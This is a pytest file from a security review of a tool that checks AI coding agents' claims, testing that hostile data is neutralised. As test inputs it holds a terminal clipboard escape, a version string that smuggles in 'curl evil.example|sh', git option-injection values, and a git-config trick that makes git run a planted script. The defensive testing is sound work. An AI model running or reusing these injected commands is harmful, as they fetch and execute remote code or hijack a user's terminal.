"""Smaller things from the security review: each one is a real way for odd data to reach the user's terminal, crash a command, or change what runs."""
import contextlib
import io
import json
import os
import subprocess
import sys

import pytest

from honestly import agents, cache, claude_code, cli, hooks, prnote, rules, support, update
from honestly.audit import Finding

posix_only = pytest.mark.skipif(sys.platform == "win32", reason="POSIX shell scripts")
ESC = "\x1b]52;c;ZXZpbA==\x07"


@pytest.fixture
def home(tmp_path, monkeypatch):
    h = tmp_path / "home"
    h.mkdir()
    monkeypatch.setenv("HOME", str(h))
    monkeypatch.setenv("USERPROFILE", str(h))
    monkeypatch.setattr(hooks, "catches_path", lambda: str(h / ".honestly" / "catches.jsonl"))
    monkeypatch.setattr(hooks, "errors_path", lambda: str(h / ".honestly" / "hook-errors.log"))
    monkeypatch.setenv("HONESTLY_NO_UPDATE_CHECK", "1")
    return h


def _cli(*args):
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        try:
            cli.main(list(args))
        except SystemExit:
            pass
    return out.getvalue()


def _log_row(home, **row):
    d = home / ".honestly"
    d.mkdir(exist_ok=True)
    with open(d / "catches.jsonl", "a", encoding="utf-8") as fh:
        fh.write(json.dumps(row) + "\n")


def _session_with_escapes(home):
    root = home / ".claude" / "projects" / "-x"
    root.mkdir(parents=True)
    say = f"All {ESC}tests pass."
    rows = [{"type": "user", "message": {"role": "user", "content": "fix"}, "origin": {"kind": "human"}, "cwd": f"/work/pro{ESC}j", "timestamp": "2026-01-01T00:00:00Z"},
            {"type": "assistant", "message": {"role": "assistant", "model": "m", "content": [{"type": "tool_use", "id": "e", "name": "Edit", "input": {"file_path": f"/work/p/a{ESC}.py"}}]}, "cwd": "/w", "timestamp": "2026-01-01T00:00:01Z"},
            {"type": "assistant", "message": {"role": "assistant", "model": "m", "content": [{"type": "text", "text": say}]}, "cwd": "/w", "timestamp": "2026-01-01T00:00:02Z"}]
    with open(root / "a.jsonl", "w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r) + "\n")


@pytest.mark.parametrize("args", [("audit", "--no-cache"), ("explain", "1", "--no-cache")])
def test_a_report_prints_no_terminal_escapes(home, args):
    _session_with_escapes(home)
    out = _cli(*args)
    assert "\x1b" not in out and "\x07" not in out
    assert "tests pass" in out


@pytest.mark.parametrize("args", [("catches",), ("feedback",)])
def test_the_catch_log_prints_no_terminal_escapes(home, args):
    _log_row(home, ts="2999-01-01T00:00:00+00:00", kind="stop", agent="claude-code", model=f"m{ESC}", project=f"/work/pro{ESC}j", claim=f"All {ESC}tests pass.", message=f"held {ESC}x", tools=[f"Bash: {ESC}ls"])
    out = _cli(*args)
    assert "\x1b" not in out and "\x07" not in out


def test_doctor_prints_no_terminal_escapes_from_its_log(home):
    d = home / ".honestly"
    d.mkdir()
    (d / "hook-errors.log").write_text(f"2026-01-01T00:00:00 stop: bad {ESC} thing\n", encoding="utf-8")
    assert "\x1b" not in _cli("doctor")


def test_the_update_note_prints_only_a_version(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    monkeypatch.delenv("HONESTLY_NO_UPDATE_CHECK", raising=False)
    for bad in (f"9.9.9{ESC}", "9.9.9 && curl evil.example|sh #", "9.9.9\nrun this", "", "latest"):
        monkeypatch.setattr(update, "_fetch_latest", lambda timeout=2.0, v=bad: v)
        if os.path.exists(update.cache_path()):
            os.remove(update.cache_path())
        assert update.update_note("0.0.1") == "", bad
    for good in ("9.9.9", "1.0", "2.0.0rc1", "1.2.3.post4"):
        monkeypatch.setattr(update, "_fetch_latest", lambda timeout=2.0, v=good: v)
        if os.path.exists(update.cache_path()):
            os.remove(update.cache_path())
        assert good in update.update_note("0.0.1"), good


def test_the_update_cache_is_not_believed_either(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    monkeypatch.delenv("HONESTLY_NO_UPDATE_CHECK", raising=False)
    os.makedirs(os.path.dirname(update.cache_path()))
    with open(update.cache_path(), "w", encoding="utf-8") as fh:
        json.dump({"ts": 10 ** 12, "latest": f"9.9.9{ESC} && curl evil.example|sh"}, fh)
    assert update.latest_version(now=10 ** 12 + 1) == ""


@posix_only
def test_a_repositorys_git_config_runs_nothing_through_git_log(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    repo.mkdir()
    env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull)
    def git(*a, **k):
        return subprocess.run(["git", *a], cwd=repo, env=env, capture_output=True, text=True, **k)
    git("init", "-q")
    git("config", "user.email", "a@b.c")
    git("config", "user.name", "a")
    (repo / "a").write_text("a")
    git("add", ".")
    tree = git("write-tree").stdout.strip()
    raw = f"tree {tree}\nauthor a <a@b.c> 1700000000 +0000\ncommitter a <a@b.c> 1700000000 +0000\ngpgsig -----BEGIN PGP SIGNATURE-----\n xx\n -----END PGP SIGNATURE-----\n\ns\n"
    sha = git("hash-object", "-t", "commit", "-w", "--stdin", input=raw).stdout.strip()
    git("update-ref", "HEAD", sha)
    marker = tmp_path / "ran"
    fake = tmp_path / "gpg.sh"
    fake.write_text(f"#!/bin/sh\ntouch {marker}\nexit 1\n")
    fake.chmod(0o755)
    git("config", "log.showSignature", "true")
    git("config", "gpg.program", str(fake))
    git("log", "-1", "--format=%cI")
    assert marker.exists()   # git itself does run it
    marker.unlink()
    prnote.window_start(str(repo), "", None)
    assert not marker.exists()


def test_a_branch_named_like_an_option_is_not_passed_on(tmp_path, monkeypatch):
    monkeypatch.setattr(prnote, "_git", lambda args, cwd: "--upload-pack=touch x" if args[0] == "symbolic-ref" else "")
    assert prnote.base_ref("/r", None) == ""


def test_an_option_is_refused_as_a_base(tmp_path):
    with pytest.raises(SystemExit):
        prnote.base_ref("/r", "--upload-pack=x")


def _hook_cmd(command):
    return {"type": "command", "command": command}


@pytest.mark.parametrize("command", ["/opt/other/sober hook verify --strict", "/usr/bin/true # honestly hook", "echo honestly hook", "my-honestly hook stop"])
def test_a_line_that_only_mentions_the_mark_is_not_ours(command):
    assert not hooks._ours(_hook_cmd(command))
    assert not agents._is_ours(_hook_cmd(command))


@pytest.mark.parametrize("command", ["honestly hook stop  # honestly hook", "/x/.venv/bin/honestly hook pre  # honestly hook", '"/my dir/bin/honestly" hook stop  # honestly hook',
                                     '"C:/Users/a/Scripts/honestly.exe" hook pre  # honestly hook', "/old/sober hook stop  # sober hook", "honestly hook stop --agent codex  # honestly hook"])
def test_real_entries_are_ours(command):
    assert hooks._ours(_hook_cmd(command))


def test_install_keeps_another_tools_hook(tmp_path, monkeypatch):
    monkeypatch.setattr(hooks, "settings_path", lambda: str(tmp_path / "settings.json"))
    (tmp_path / "settings.json").write_text(json.dumps({"hooks": {"Stop": [{"hooks": [_hook_cmd("/opt/other/sober hook verify")]}]}}))
    assert "/opt/other/sober" in hooks.guard("install", dry_run=True)


def _plugin_holds(tmp_path, settings):
    home = tmp_path / "h"
    (home / ".claude").mkdir(parents=True, exist_ok=True)
    (home / ".claude" / "settings.json").write_text(json.dumps(settings))
    path = tmp_path / "s.jsonl"
    rows = [{"type": "user", "message": {"role": "user", "content": "fix"}, "origin": {"kind": "human"}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:00Z"},
            {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "e", "name": "Edit", "input": {"file_path": "/w/p/a.py"}}]}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:01Z"},
            {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": "All tests pass."}]}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:02Z"}]
    path.write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    env = dict(os.environ, HOME=str(home), USERPROFILE=str(home), LANG="en_US.UTF-8", PYTHONPATH="")
    env.pop("CLAUDE_CONFIG_DIR", None)
    payload = json.dumps({"transcript_path": str(path), "cwd": "/w/p", "last_assistant_message": "All tests pass.", "stop_hook_active": False})
    r = subprocess.run([sys.executable, os.path.join(root, "hooks", "run.py"), "hook", "stop"], input=payload.encode(), capture_output=True, env=env)
    return b'"decision"' in r.stdout


@posix_only
def test_the_plugin_is_not_switched_off_by_a_line_that_mentions_the_mark(tmp_path):
    real = sys.executable
    assert _plugin_holds(tmp_path, {})
    assert _plugin_holds(tmp_path, {"hooks": {"Notification": [{"hooks": [_hook_cmd(f"{real} # honestly hook")]}]}})
    assert _plugin_holds(tmp_path, {"hooks": {"Stop": [{"hooks": [_hook_cmd(f"{real} # sober hook")]}]}})


@posix_only
def test_the_plugin_steps_aside_for_a_real_installed_guard(tmp_path):
    exe = tmp_path / "bin" / "honestly"
    exe.parent.mkdir()
    exe.write_text("#!/bin/sh\n")
    exe.chmod(0o755)
    settings = {"hooks": {"Stop": [{"hooks": [_hook_cmd(f"{exe} hook stop  # honestly hook")]}], "PreToolUse": [{"hooks": [_hook_cmd(f"{exe} hook pre  # honestly hook")]}]}}
    assert not _plugin_holds(tmp_path, settings)


@pytest.mark.parametrize("row", [{"project": 5}, {"message": 5}, {"agent": 5}, {"tools": 5}, {"claim": 5}, {"tools": [5, None]}, {"model": []}, {"kind": 5}, {"topic": {}}, {"message": None, "project": None}])
def test_a_bad_row_in_the_log_breaks_no_command(home, row):
    _log_row(home, ts="2999-01-01T00:00:00+00:00", **row)
    for args in (("catches",), ("feedback",), ("doctor",)):
        _cli(*args)
    assert hooks.load_catches()


def test_a_row_that_is_not_an_object_or_has_a_bad_time_is_skipped_quietly(home):
    d = home / ".honestly"
    d.mkdir()
    (d / "catches.jsonl").write_text('[1, 2]\nnull\n{"ts": 5}\nnot json\n', encoding="utf-8")
    _cli("catches")
    _cli("feedback")


def _finding(**kw):
    base = dict(session="s", turn=0, version="", agent="a", model="m", ts="t", category="tests_pass", verdict="unbacked", reason="r", claim="c", last_edit="", tools_after_edit=[], context="")
    base.update(kw)
    return Finding(**base)


@pytest.mark.parametrize("bad", [{"reason": 5}, {"claim": None}, {"tools_after_edit": 5}, {"tools_after_edit": [5]}, {"turn": "x"}, {"verdict": []}, {"extra": 1}])
def test_a_cache_entry_of_the_wrong_shape_is_a_miss(tmp_path, monkeypatch, bad):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    session = tmp_path / "s.jsonl"
    session.write_text("{}\n")
    cache.put(str(session), "", [_finding()])
    assert cache.get(str(session), "")
    name = os.path.join(cache.cache_dir(), os.listdir(cache.cache_dir())[0])
    entry = json.load(open(name, encoding="utf-8"))
    row = entry["findings"][0]
    row.update(bad)
    with open(name, "w", encoding="utf-8") as fh:
        json.dump(entry, fh)
    assert cache.get(str(session), "") is None


@pytest.mark.parametrize("command", [True, 5, ["ls"], {"a": 1}, None])
def test_a_command_that_is_not_text_does_not_stop_the_check(tmp_path, command):
    rows = [{"type": "user", "message": {"role": "user", "content": "fix"}, "origin": {"kind": "human"}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:00Z"},
            {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "e", "name": "Edit", "input": {"file_path": "/w/p/a.py"}}]}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:01Z"},
            {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "b", "name": "Bash", "input": {"command": command}}]}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:02Z"},
            {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": "All tests pass."}]}, "cwd": "/w/p", "timestamp": "2026-01-01T00:00:03Z"}]
    path = tmp_path / "s.jsonl"
    path.write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    out = hooks.stop_hook({"transcript_path": str(path), "cwd": "/w/p", "last_assistant_message": "All tests pass.", "stop_hook_active": False})
    assert out and out["decision"] == "block"
    assert claude_code.parse_session(str(path))[0].events[1].text == ""


@pytest.mark.parametrize("field,value", [("cwd", 5), ("cwd", ["x"]), ("transcript_path", ["x"]), ("transcript_path", 5), ("last_assistant_message", 5), ("last_assistant_message", ["x"]), ("model", ["x"])])
def test_hook_input_of_the_wrong_shape_is_ignored_not_fatal(field, value):
    hooks.stop_hook({field: value})
    hooks.pre_hook({field: value, "tool_name": "Bash", "tool_input": {"command": "pytest | head"}})


def test_a_final_message_still_counts_when_another_field_is_bad():
    assert agents.normalize("claude-code", "stop", {"cwd": 5, "last_assistant_message": "x"}) == {"last_assistant_message": "x"}


def test_the_self_test_leaves_nothing_behind(tmp_path, monkeypatch):
    import tempfile
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    results = support.self_test()
    assert [ok for _, ok, _ in results] == [True, True]
    assert not [n for n in os.listdir(tmp_path) if n.startswith("honestly-doctor-")]


def test_no_message_suggests_a_fixed_path_in_tmp():
    with open(prnote.__file__, encoding="utf-8") as fh:
        assert "/tmp/" not in fh.read()


@pytest.mark.parametrize("path", ["/work/proj/docs/app.py", "docs/app.py", "/work/memory/app.py", "/work/proj/doc/server.ts", "docs/conf.py"])
def test_code_under_a_docs_folder_is_still_code(path):
    assert not rules.path_is_doc(path)


@pytest.mark.parametrize("path", ["/work/proj/docs/guide.md", "docs/index.html", "docs/_config.yml", "docs/assets/site.css", "/work/memory/notes.md", "/tmp/x/app.py", "/work/.claude/settings.py", "/private/tmp/app.py", "CHANGELOG.md"])
def test_notes_and_scratch_files_are_still_not_code(path):
    assert rules.path_is_doc(path)
